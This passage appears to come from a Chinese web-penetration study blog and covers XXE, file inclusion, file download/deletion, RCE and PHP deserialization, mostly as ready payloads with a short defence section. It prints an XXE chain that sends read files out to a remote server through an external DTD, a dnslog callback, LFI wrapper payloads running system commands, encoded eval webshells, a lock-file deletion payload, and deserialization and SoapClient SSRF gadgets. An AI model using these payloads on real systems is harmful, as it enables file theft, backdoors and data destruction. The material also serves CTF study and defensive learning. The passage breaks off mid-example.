声明、DTD 文 档类型定义 (可选)、文档元素，其焦点是数据的内容，其把数据从 HTML 分 离，是独立于软件和硬件的信息传输工具。XXE 漏洞全称 XML External Entity Injection，即 xml 外部实体注入漏洞，XXE 漏洞发生在应用程序解析 XML 输入 时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站等危害。</p>\n<p>（2）XXE 漏洞利用：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">读取文件：可以用来读取数据库配置文件，/etc/passwd等敏感文件</span></span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE Mikasa [</span><br><span class=\"line\">&lt;!ENTITY test SYSTEM &quot;file:///d:/e.txt&quot;&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\">]&gt;</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\">&lt;user&gt;&lt;username&gt;&amp;<span class=\"built_in\">test</span>;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">带外测试：解决命令执行无回显的问题</span></span><br><span class=\"line\"></span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE test [</span><br><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;curl [http://9v57ll.dnslog.cn&quot;&gt;](http://9v57ll.dnslog.cn&gt;)</span><br><span class=\"line\"><span class=\"meta prompt_\">%</span><span class=\"language-bash\">file;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">]&gt;</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\">&lt;user&gt;&lt;username&gt;&amp;send;&lt;/username&gt;&lt;password&gt;Mikasa&lt;/password&gt;&lt;/user&gt;</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"xml-引用外部实体\"><a class=\"markdownIt-Anchor\" href=\"#xml-引用外部实体\">#</a> XML 引用外部实体</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">无回显读文件: 引用外部实体，读取本地文件发送到远程地址</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">既然这个数据是用脚本语言解析的、那么有没有可能构造 py 代码，直接用 py 代码解析下面的 XML 语言，用来读取到服务器上的数据;肯定是可以的，用 py 来解析 xml 语言获取其中关键信息</span></span><br><span class=\"line\">&lt;?xml version=&quot;1.0&quot;?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE ANY[</span><br><span class=\"line\">&lt;!ENTITY % file SYSTEM &quot;file:///d:/e.txt&quot;&gt;</span><br><span class=\"line\">&lt;!ENTITY % remote SYSTEM &quot;http://47.94.236.117/test.dtd&quot;&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\">%</span><span class=\"language-bash\">remote;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">%</span><span class=\"language-bash\">all;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">]&gt;</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\">&lt;root&gt;&amp;send;&lt;/root&gt;</span></span><br><span class=\"line\">test.dtd</span><br><span class=\"line\">&lt;!ENTITY % all &quot;&lt;!ENTITY send SYSTEM &#x27;http://47.94.236.117/get.php?file=%file;&#x27;&gt;&quot;&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将payload发送到存在xml漏洞的位置，并在远程服务器构造test.dtd和get.php, get.php 读取file数据并记录在本地，漏洞被触发的时候就会在远程生成目录内容为读取到的d:/e.txt。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">其他如可以进行php://filter协议来进行编码绕过</span></span><br></pre></td></tr></table></figure>\n<h4 id=\"xml-测试及防御\"><a class=\"markdownIt-Anchor\" href=\"#xml-测试及防御\">#</a> XML 测试及防御</h4>\n<p>（1）XML 测试：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如果当前关键字Content-Type是xml，可尝试发送xml语言的payload测试；即便此处不是xml依然可以修改类型然后测试。一般的xxe漏洞利用形式如下：</span></span><br><span class=\"line\">&lt;?xml version = &quot;1.0&quot; ?&gt;</span><br><span class=\"line\">&lt;!DOCTYPE ANY [</span><br><span class=\"line\">&lt;!ENTITY f SYSTEM &quot;file:///home/ctf/flag.txt&quot; &gt;</span><br><span class=\"line\"><span class=\"meta prompt_\">]&gt;</span><span class=\"language-bash\"></span></span><br><span class=\"line\"><span class=\"language-bash\">&lt;x&gt; &amp;f; &lt;/x&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">对方后台中有函数可以接受此数据并进行分析如php://input，如果对方数据过滤不严谨，是会执行恶意xml。会有一种情况，输入xxe代码，对方无回显无法确定当前是自己 payload有问题还是不存在漏洞，就可以使用dnslog解决命令执行漏洞无回显问题。</span></span><br></pre></td></tr></table></figure>\n<p>（2）XXE 白盒发现：</p>\n<p>可通过应用功能追踪代码定位审计</p>\n<p>可通过脚本特定函数搜索定位审计</p>\n<p>可通过伪协议玩法绕过相关修复等</p>\n<p>（3）XXE 修复防御方案：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">禁用外部实体</span></span><br><span class=\"line\">PHP:libxml_disable_entity_loader(true);</span><br><span class=\"line\">JAVA:DocumentBuilderFactory dbf=DocumentBuilderFactory.newInstance();dbf.setExpandEntityReferences(false);</span><br><span class=\"line\">Python：from lxml import etreexmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">过滤用户提交的XML数据：</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">过滤关键词：&lt;!DOCTYPE和&lt;!ENTITY，或者SYSTEM和PUBLIC</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"lfi-rfi\"><a class=\"markdownIt-Anchor\" href=\"#lfi-rfi\">#</a> LFI、RFI</h3>\n<h4 id=\"lfi-定义-利用\"><a class=\"markdownIt-Anchor\" href=\"#lfi-定义-利用\">#</a> LFI 定义 利用</h4>\n<p>（1）文件包含 lfi 定义：</p>\n<p>php 中的 include 函数，如果其后跟上了一个固定的文件，那么就会在加载原来的文件的时候执行 include 所包含的文件且不论这个文件是以何种后缀结尾都会被解析成 php；如果包含的是个由用户可以控制的文件，那么就存在文件包含漏洞，用户可以指定需要包含的文件进行恶意的读取相关敏感数据或者造成权限丢失。</p>\n<p>（2）文件包含 LFI 漏洞利用：</p>\n<p>配合文件上传，上传带图片马，用文件包含此图片，脚本代码会被触发。</p>\n<p>配合日志文件，日志文件会记录 UA 信息，修改 UA 为后门代码，包含即可执行后门代码。</p>\n<p>配合伪协议，利用没有被禁的协议，用 php 伪协议读写文件或者写入后门。</p>\n<p>配合会话文件，配合网站后台的 session 目录及其内容使用，每一次访问都会生成一个新的 seesion，而在 php 中是可以通过控制访问网站时的 cookie 值来改变服务器存储的 session 文件名以及通过 post 数据可以改变 session 存储文件中的内容。</p>\n<h4 id=\"lfi-配合伪协议使用\"><a class=\"markdownIt-Anchor\" href=\"#lfi-配合伪协议使用\">#</a> LFI 配合伪协议使用</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">php://filter使用较多，可以直接读取相关文件</span></span><br><span class=\"line\">?file=php://filter/read=convert.base64-encode/resource=flag.php</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">php://input协议需要开启一些开关才可以使用</span></span><br><span class=\"line\">?file=php://input post:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">远程包含需要对方在.php.ini中开启相关开关才能使用</span></span><br><span class=\"line\">?file=http://www.xxx.com/1.txt 1.txt:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">利用base 64 加密可以逃过一些防护措施的检测</span></span><br><span class=\"line\">?file=data://text/plain,&lt;?=system(&#x27;tac flag.*&#x27;);?&gt;</span><br><span class=\"line\">?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCd0YWMgZmxhZy5waHAnKTs/Pg==</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">使用file协议时需要用到绝对路径，使用php伪协议时需要使用php关键字，需要使用远程包含需要服务器允许，相比之下写入日志没有那么多的限制</span></span><br><span class=\"line\">?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>\n<h4 id=\"filter-伪协议加密\"><a class=\"markdownIt-Anchor\" href=\"#filter-伪协议加密\">#</a> filter 伪协议加密</h4>\n<p>php://filter/write 的加密编码：(伪协议可使用但相关字段被绕过的情况)</p>\n<p>将 php://filter/write=convert.base64-decode/resource=123.php 进行 url 编码， 浏览器会自动进行一次 url 解码，将 content=aaPD9waHAgQGV2YWwoJF9QT1NUW2FdKTs/Pg== 通过 post 的方式上传，意味着将要对 123.php 的文件写入，写入的内容为 content 内容解码后的数据，采用这种方法需要就实际场景进行构造。</p>\n<p>将 php://filter/write=string.rot13/resource=2.php 进行 url 编码，rot13 表示的是 写入的文件是采用凯撒加密偏移量为 13，将 content=<?cuc riny($_CBFG[1]);?> 通过 post 方式上传，在 base64 被过滤的情况下可以使用此方法绕过。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">convert.iconv.：一种过滤器，和使用iconv()函数处理流数据有等同作用</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">result = iconv(<span class=\"string\">&quot;UCS-2LE&quot;</span>,<span class=\"string\">&quot;UCS-2BE&quot;</span>, <span class=\"string\">&#x27;&lt;?php eval($_POST[a]);?&gt;&#x27;</span>);</span></span><br><span class=\"line\">echo &quot;经过一次反转:&quot;.$result.&quot;\\n&quot;;</span><br><span class=\"line\">echo &quot;经过第二次反转:&quot;.iconv(&quot;UCS-2LE&quot;,&quot;UCS-2BE&quot;, $result);</span><br><span class=\"line\">?&gt;</span><br><span class=\"line\">Payload：file=php://filter/write=convert.iconv.UCS-2LE.UCS-2BE/resource=a.php</span><br><span class=\"line\">contents=?&lt;hp pvela$(P_SO[T]a;)&gt;?</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">如果include中的内容默认添加前缀可以用../的方式读取一些文件，但却不能用伪协议了，如果是有增加后缀的方法，则无法读取文件。</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"文件操作\"><a class=\"markdownIt-Anchor\" href=\"#文件操作\">#</a> 文件操作</h3>\n<h4 id=\"敏感文件下载\"><a class=\"markdownIt-Anchor\" href=\"#敏感文件下载\">#</a> 敏感文件下载</h4>\n<p>（1）文件下载的寻找及利用：</p>\n<p>文件下载：流程 - 功能点抓包 - 寻代码文件 - 寻变量控制 - 构造测试。</p>\n<p>寻找：/1.pdf 不存在此漏洞，/?file=1.pdf 可能存在。</p>\n<p>利用：后台首页日志文件、数据库配置文件、中间件配置文件、各种接口文件、密钥信息等文件、扫描工具爬行；或者下载好的代码去分析路径、找到对方的 cms 直接查数据库配置文件。</p>\n<p>（2）代码中的文件下载漏洞：</p>\n<p>java：如何发现了下载漏洞但是 get 方法无法获取到文件，可以尝试切换到 post 或者其他提交方式进行下载，javaWEB 中 WEB 的配置文件 WEB-INF/web.xml，里边有很多重要的信息，配置文件中的 com.wm.ctf.FlagController 表示实际中的 WEB-INF/classes/com/wm/ctf/ FlagController.class。</p>\n<p>php：如果需要登陆可以点击登陆分析数据包。分析 url 地址判断是可能存在哪种漏洞，判断对方是根据哪个关键字识别是否登陆的，如果有 mvc 的框架，可尝试下载 module 中的敏感文件如…xx…/etc/nginx/nginx.conf。</p>\n<h4 id=\"恶意文件删除\"><a class=\"markdownIt-Anchor\" href=\"#恶意文件删除\">#</a> 恶意文件删除</h4>\n<p>文件删除：流程 - 特定函数搜索 - 寻触发调用 - 构造 Payload 测试</p>\n<p>Payload: /admin/admin_article.php?act=del_img&amp;img=…/…/data/install.lock</p>\n<p>在网站某些功能点可以删除文件时，抓包测试，如后台模版删除文件点进行删除测试，删除 install/install_lock.txt 删除后则重新安装网站。</p>\n<h4 id=\"重要文件读取\"><a class=\"markdownIt-Anchor\" href=\"#重要文件读取\">#</a> 重要文件读取</h4>\n<p>文件读取：流程 - 特定函数搜索 - 寻触发调用 - 构造 Payload 测试</p>\n<p>Payload：/include/thumb.php?dir=http…\\config\\config_db.php</p>\n<p>如果能够显示源代码则是文件读取漏洞</p>\n<h4 id=\"黑盒探针\"><a class=\"markdownIt-Anchor\" href=\"#黑盒探针\">#</a> 黑盒探针</h4>\n<p>（1）URL 参数名及参数值分析：<br>\n参数名：英文对应翻译<br>\n参数值：目录或文件名</p>\n<p>（2）功能点自行修改后分析：<br>\n文件下载，删除，读取等</p>\n<h3 id=\"rce漏洞\"><a class=\"markdownIt-Anchor\" href=\"#rce漏洞\">#</a> RCE 漏洞</h3>\n<p>（1）RCE 漏洞分类</p>\n<p>代码执行：引用脚本代码解析执行，如 eval (‘phpinfo ();’);</p>\n<p>命令执行：脚本调用操作系统命令，如 system (‘ipconfig’);</p>\n<p>在源码中要找 RCE 漏洞话需要搜索特定函数，看其是从哪里输入进来的，有哪些过滤是否能绕过；如果没有源码的情况就得去从功能点测试。</p>\n<p>（2）漏洞函数</p>\n<p>PHP：eval ()、assert ()、preg_replace ()、call_user_func ()、call_user_func_array () 以及 array_map () 等；system、shell_exec、popen、passthru、proc_open 等</p>\n<p>Python：eval exec subprocess os.system commands</p>\n<p>Java：Java 中没有类似 php 中 eval 函数这种直接可以将字符串转化为代码执行的函数，但是有反射机制，并且有各种基于反射机制的表达式引擎，如：OGNL、SpEL、MVEL 等.</p>\n<p>（3）RCE 漏洞绕过方法</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">基本绕过方法</span></span><br><span class=\"line\">system(&#x27;tac fla*.php&#x27;);</span><br><span class=\"line\">cp fla*.ph* 2.txt;</span><br><span class=\"line\">echo shell_exec(&#x27;tac fla*.ph*&#x27;);</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过<span class=\"built_in\">eval</span>传递参数，在拼接新的变量值可以绕过敏感函数被过滤的限制</span></span><br><span class=\"line\"><span class=\"meta prompt_\">eval($</span><span class=\"language-bash\">_GET[1]);&amp;1=system(<span class=\"string\">&#x27;tac flag.php&#x27;</span>);</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">通过文件包含，传递a参数为执行系统命令的data协议，可以绕过分号限制</span></span><br><span class=\"line\"><span class=\"meta prompt_\">include$</span><span class=\"language-bash\">_GET[a]?&gt;&amp;a=data://text/plain,&lt;?=system(<span class=\"string\">&#x27;tac flag.php&#x27;</span>);?&gt;</span></span><br><span class=\"line\"><span class=\"meta prompt_\">include$</span><span class=\"language-bash\">_GET[a]?&gt;&amp;a=php://filter/read=convert.base64-encode/resource=flag.php</span></span><br><span class=\"line\">data://text/plain,&lt;?=system(&#x27;tac fla*&#x27;);?&gt;</span><br><span class=\"line\">php://input post:&lt;?php system(&#x27;tac flag.php&#x27;);?&gt;</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">工具推荐 GUI_TOOLS_V.. 是一个工具集成化的工具箱</span></span><br></pre></td></tr></table></figure>\n<h3 id=\"反序列化漏洞\"><a class=\"markdownIt-Anchor\" href=\"#反序列化漏洞\">#</a> 反序列化漏洞</h3>\n<h4 id=\"php-魔术方法\"><a class=\"markdownIt-Anchor\" href=\"#php-魔术方法\">#</a> php 魔术方法</h4>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">php中有类的反序列化中常见的魔术方法:</span></span><br><span class=\"line\">__construct()//创建对象时触发,执行unserialize()时如果不new是不会触发这个函数</span><br><span class=\"line\">__destruct() //对象被销毁时触发，执行unserialize()时销毁阶段会触发这个函数</span><br><span class=\"line\">__toString() //对象被当作字符串时被调用</span><br><span class=\"line\">__call() //当调用类中不存在的方法时，就会调用call()</span><br><span class=\"line\">__get() //当调用类中不存在的属性时，就会调用get()</span><br><span class=\"line\">__set() //当设置类中不存在的属性时，就会调用set()</span><br><span class=\"line\">__sleep() //当执行serialize()方法时，就会调用sleep()</span><br><span class=\"line\">__wakeup() //当执行unserialize()时，就会调用wakeup()</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">序列化字符串中表示对象属性个数的值大于真实的属性个数时会跳过__wakeup，即CVE-2016-7124</span></span><br><span class=\"line\">__isset() //当对不可访问属性调用isset()或empty()时，就会调用__isset()</span><br><span class=\"line\">__unset() //当对不可访问属性调用unset()时触发，销毁对象的某个属性时执行此函数</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">实例化之后访问private是不可访问的，但是访问public是可以访问的</span></span><br><span class=\"line\">__invoke() //将对象当做函数来使用时执行此方法，通常不推荐这样做</span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">查看php魔术方法的原生类有哪些：</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">classes = get_declared_classes();</span></span><br><span class=\"line\">foreach ($classes as $class) &#123;</span><br><span class=\"line\"><span class=\"meta prompt_\">  $</span><span class=\"language-bash\">methods = get_class_methods(<span class=\"variable\">$class</span>);</span></span><br><span class=\"line\">  foreach ($methods as $method) &#123;</span><br><span class=\"line\">    if (in_array($method, array (</span><br><span class=\"line\">      &#x27;__destruct&#x27;,</span><br><span class=\"line\">      &#x27;__toString&#x27;,</span><br><span class=\"line\">      &#x27;__wakeup&#x27;,</span><br><span class=\"line\">      &#x27;__call&#x27;,</span><br><span class=\"line\">      &#x27;__callStatic&#x27;,</span><br><span class=\"line\">      &#x27;__get&#x27;,</span><br><span class=\"line\">      &#x27;__set&#x27;,</span><br><span class=\"line\">      &#x27;__isset&#x27;,</span><br><span class=\"line\">      &#x27;__unset&#x27;,</span><br><span class=\"line\">      &#x27;__invoke&#x27;,</span><br><span class=\"line\">      &#x27;__set_state&#x27;</span><br><span class=\"line\">    ))) &#123;</span><br><span class=\"line\">      print $class. &#x27;::&#x27;. $method. &quot;\\n&quot;;</span><br><span class=\"line\">    &#125; &#125; &#125;</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<h4 id=\"php-反序列化\"><a class=\"markdownIt-Anchor\" href=\"#php-反序列化\">#</a> php 反序列化</h4>\n<p>(1) php 反序列化漏洞原理:</p>\n<p>未对用户输入的序列化字符串进行检测，导致攻击者可以控制反序列化过 程，从而导致代码执行，SQL 注入，目录遍历等不可控后果。在反序列化的过 程中自动触发了某些魔术方法。当进行反序列化的时候就有可能会触发对象中 的一些魔术方法。</p>\n<p>php 中有一些魔术方法，在实例化时后者其他操作时不经意间出发了类中的 方法，可以利用这个特点，将自己伪造的数据带入其中，让自己伪造的数据反 序列化后可以读取存储在类中魔术方法中的数据如果参数是一个类，需要重写 这个类，并且将所有的变量按照自己破解的规范进行书写，最后进行实例化与 url 加密序列化后的数据。</p>\n<p>（2）一个生成序列化值的例子：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">实例化之后，会调用__construct方法，并且因为是实例是可以调用ctfShowUser中的私有变量的，</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">将此定义号的 class 变量设置为 new backDoor 意味着再次调用 backDoor 中的私有变量 code，并且执行相应的命令。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">最后将该操作流程返回的数据进行序列化和 url 编码后代入到原来的题目中即可执行此命令。</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\">class ctfShowUser</span><br><span class=\"line\">  &#123;private $class;</span><br><span class=\"line\">  public function __construct()&#123;</span><br><span class=\"line\">    $this-&gt; class = new backDoor();</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">class backDoor&#123;</span><br><span class=\"line\">  private $code=&#x27;system(&quot;cat f*&quot;);&#x27;;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">b= new ctfShowUser();</span></span><br><span class=\"line\">echo serialize($b);</span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>（3）序列化数据显示：</p>\n<p>private 属性序列化的时候格式是 %00 类名 %00 成员名</p>\n<p>protect 属性序列化的时候格式是 %00*%00 成员名</p>\n<p>序列化时 % 00 会被当成一个长度为一的字符串处理但是不会显示出来，一般是</p>\n<p>序列化时候需要通过编码才可以进行利用。如 test 类下的 private age:“29” 经过序列化之后的数据为 s:9:“testage”</p>\n<h4 id=\"php-原生类\"><a class=\"markdownIt-Anchor\" href=\"#php-原生类\">#</a> php 原生类</h4>\n<p>(4) 利用 php 原生类 SoapClient 类进行读文件:</p>\n<p>PHP 的内置类 SoapClient 是一个专门用来访问 web 服务的类，可以提供一 个基于 SOAP 协议访问 Web 服务的 PHP 客户端。</p>\n<p>该内置类有一个 __call 方法，当 __call 方法被触发后，它可以发送 HTTP 和 HTTPS 请求。正是这个 __call 方法，使得 SoapClient 类可以被我们运用在 SSRF 中。而__call 触发很简单，就是当对象访问不存在的方法的时候就会触发。</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">SoapClient</span></span><br><span class=\"line\">public SoapClient :: SoapClient(mixed $wsdl [，array $options ])</span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">第一个参数是用来指明是否是wsdl模式，将该值设为null则表示非wsdl模式。</span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">第二个参数为一个数组，如果在wsdl模式下，此参数可选；如果在非wsdl模式下，则必须设置location和uri选项，其中location是要将请求发送到的SOAP服务器的URL，而uri 是SOAP服务的目标命名空间</span></span><br><span class=\"line\"><span class=\"meta prompt_\"></span></span><br><span class=\"line\"><span class=\"meta prompt_\"># </span><span class=\"language-bash\">直接利用SoapClient来进行SSRF</span></span><br><span class=\"line\">&lt;?php</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">a = new SoapClient(null, array (<span class=\"string\">&#x27;location&#x27;</span>=&gt;<span class=\"string\">&#x27;http://ip:10000/aaa&#x27;</span>, <span class=\"string\">&#x27;uri&#x27;</span>=&gt;<span class=\"string\">&#x27;http://ip:10000&#x27;</span>));</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">b = serialize(<span class=\"variable\">$a</span>);</span></span><br><span class=\"line\">echo $b;</span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">c = unserialize(<span class=\"variable\">$b</span>);</span></span><br><span class=\"line\"><span class=\"meta prompt_\">$</span><span class=\"language-bash\">c-&gt;a(); // 随便调用对象中不存在的方法, 触发__call方法进行ssrf</span></span><br><span class=\"line\">?&gt;</span><br></pre></td></tr></table></figure>\n<p>（5）本地 Demo-xss：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span 